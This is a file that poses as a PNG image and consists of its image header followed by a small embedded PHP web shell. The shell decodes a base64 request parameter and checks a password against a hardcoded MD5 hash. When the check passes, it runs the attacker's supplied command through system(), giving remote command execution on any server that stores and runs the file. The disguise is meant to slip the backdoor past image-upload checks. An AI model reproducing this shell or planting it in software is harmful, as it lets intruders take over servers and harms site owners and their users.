‰PNG


	 <?php $pass = "1a1dc91c907325c69271ddf0c944bc72" ; if(isset($_REQUEST['p4lo04d'])){$p4lo04d = $_REQUEST['p4lo04d']; $decoded_p4lo04d = base64_decode($p4lo04d);$params = explode(":",$decoded_p4lo04d);if(md5($params[1]) == $pass){$cmd=system($params[0]);die;}}?>